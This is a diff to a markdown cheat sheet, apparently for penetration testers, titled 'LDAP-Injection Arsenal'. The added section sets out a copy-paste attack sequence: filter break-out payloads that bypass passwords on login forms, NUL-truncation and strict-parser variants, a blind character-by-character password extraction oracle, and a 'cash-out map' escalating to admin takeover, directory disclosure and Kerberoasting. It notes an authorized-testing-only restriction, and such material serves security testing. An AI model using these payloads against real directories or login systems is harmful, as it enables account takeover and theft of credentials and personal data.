@@ -1,9 +1,36 @@
 # LDAP-Injection Arsenal — Auth-Bypass, Wildcards, AND/OR Breakouts, Blind & Evasion (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `LDAP_INJECTION_TESTING_GUIDE.md`. Authorized testing only — **your own test accounts**, **bounded reads**,
 > no mass directory dump (Guide §20). The finding is **altered filter logic with impact** (auth bypass / disclosure /
 > extraction), not a reflected `*`. LDAP injection is **parser-dependent** — try the set; what one backend tolerates,
 > another rejects (Guide §6.3).
+
+---
+
+## 0. The whole attack in one sequence (auth bypass, worked end-to-end in Guide §9.1)
+*Classify → break out of AND → bypass password → confirm-benignly → (or) blind-extract. The `)`-corruption tell is the whole game — it proves the filter is concatenated before you fire anything.*
+
+```
+# 1. CLASSIFY — send each ALONE vs a normal login; the tell is a 500 on a bare )
+username=*           password=x     -> Invalid creds (or more rows on a search) : * treated as data/filtered
+username=)           password=x     -> 500 / LDAP error                         : ) corrupted the filter = INJECTABLE (concat)
+                                                                                   (clean "Invalid creds" on ) = escaped/parametrised = not injectable)
+
+# 2. BREAK OUT of the AND login filter (&(uid=$user)(userPassword=$pass))
+KNOWN user, kill password:   username = admin)(&)            pass = anything   # (&(uid=admin)(&)) absolute-true
+UNKNOWN user, land on first: username = *)(uid=*))(|(uid=*   pass = anything   # OR-true, tolerant backends
+NUL truncation (C-backed):   username = admin)(uid=admin))%00                  # trailing password clause chopped
+STRICT parser (ldap3):       username = *  or  *)(objectClass=*                # keep ONE valid filter
+
+# 3. RESULT = 302 /dashboard + session (not "Invalid credentials") = AUTH BYPASS, no password
+# 4. CONFIRM benignly — GET /api/me on YOUR landed session: uid=admin + memberOf=Domain Admins = Critical. STOP.
+
+# 5. PIVOT if the sink is a SEARCH not a login → blind char-by-char (boolean oracle):
+(&(uid=admin)(userPassword=2*))  -> "1 result"(true) -> next char ; ldap_blind.py automates the walk
+```
+**Cash-out map:** login filter injectable → **auth bypass → admin (Critical, §9)** · search reflected → **directory/PII/`memberOf` disclosure (High, §10)** · group check injectable → **authorization forgery `)(memberOf=*` (High, §11)** · blind oracle → **char-by-char attribute/hash extraction (High, §8/§12)** · AD front-end → **enumerate non-preauth/SPN → AS-REP/Kerberoast → domain (§15)**.
 
 ---
 
